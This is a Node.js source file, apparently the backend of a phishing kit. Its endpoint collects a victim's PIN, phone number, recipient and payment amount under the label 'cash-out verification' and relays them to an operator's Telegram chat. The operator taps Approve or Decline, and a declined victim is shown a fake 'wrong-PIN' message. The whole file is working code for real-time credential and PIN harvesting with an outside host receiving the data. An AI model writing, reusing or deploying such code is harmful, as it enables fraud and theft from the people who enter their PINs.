// telegram-bot.js — PIN verification flow
const crypto = require('crypto');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '';

const pending = new Map();     // id -> { status, messageId }
const decisions = new Map();   // id -> 'pending' | 'approved' | 'declined'

function log(m) { console.log('[tg-pin]', m); }

async function sendTelegramMessage(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error('Telegram not configured.');
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      reply_markup: keyboard ? { inline_keyboard: keyboard } : undefined
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error('Telegram send failed: ' + (data.description || 'unknown'));
  return data.result;
}

async function answerCallback(cqId, text) {
  if (!BOT_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: cqId, text, show_alert: false })
  }).catch(() => {});
}

async function clearButtons(messageId) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(() => {});
}

async function handleUpdate(update) {
  const cq = update && update.callback_query;
  if (!cq) return;
  const data = cq.data || '';
  const [action, requestId] = data.split(':');
  if (!action || !action.startsWith('pin_') || !requestId) return;

  const target =
    action === 'pin_approve' ? 'approved' :
                              'declined';

  decisions.set(requestId, target);
  const entry = pending.get(requestId);
  if (entry) entry.status = target;

  await answerCallback(cq.id, target === 'approved'
    ? '✅ Approved — client continues.'
    : '❌ Declined — client sees wrong-PIN.');
  log(`pin ${requestId} → ${target}${entry ? '' : ' (recovered)'}`);

  const messageId = cq.message && cq.message.message_id;
  if (messageId) await clearButtons(messageId);
}

function registerRoutes(app) {
  app.post('/api/verify/send', async (req, res) => {
    try {
      const { pin, number, country, recipient, amount, currency, reference, method, fee } = req.body || {};
      if (!pin || !number) return res.status(400).json({ error: 'Missing pin or number' });

      const requestId = crypto.randomBytes(8).toString('hex');
      pending.set(requestId, { status: 'pending', messageId: null });
      decisions.set(requestId, 'pending');

      const safe = (v) => String(v == null ? '—' : v)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

      const text =
        `<b>🔐 New cash-out verification</b>\n\n` +
        `<b>PIN entered:</b> <code>${safe(pin)}</code>\n` +
        `<b>Number:</b> ${safe(number)}\n` +
        `<b>Country:</b> ${safe(country)}\n` +
        `<b>Recipient:</b> ${safe(recipient)}\n` +
        `<b>Method:</b> ${safe(method)}\n` +
        `<b>Amount:</b> ${safe(currency)} ${safe(amount)}\n` +
        (fee ? `<b>Fee:</b> ${safe(currency)} ${safe(fee)}\n` : '') +
        (reference ? `<b>Reference:</b> <code>${safe(reference)}</code>\n` : '') +
        `\n<b>Request ID:</b> <code>${requestId}</code>`;

      const keyboard = [[
        { text: '✅ Approve', callback_data: `pin_approve:${requestId}` },
        { text: '❌ Decline', callback_data: `pin_decline:${requestId}` }
      ]];

      const sent = await sendTelegramMessage(text, keyboard);
      const e = pending.get(requestId);
      if (e) e.messageId = sent.message_id;

      log(`PIN request ${requestId} sent`);
      res.json({ requestId });
    } catch (err) {
      console.error('[tg-pin] send error', err);
      res.status(500).json({ error: 'Telegram send failed' });
    }
  });

  app.get('/api/verify/status/:id', (req, res) => {
    const id = req.params.id;
    const live = pending.get(id);
    if (live && live.status !== 'pending') return res.json({ status: live.status });
    const stored = decisions.get(id);
    if (stored) return res.json({ status: stored });
    res.json({ status: 'pending' });
  });

  log('Routes: /api/verify/send, /api/verify/status/:id');
}

module.exports = { registerRoutes, handleUpdate };
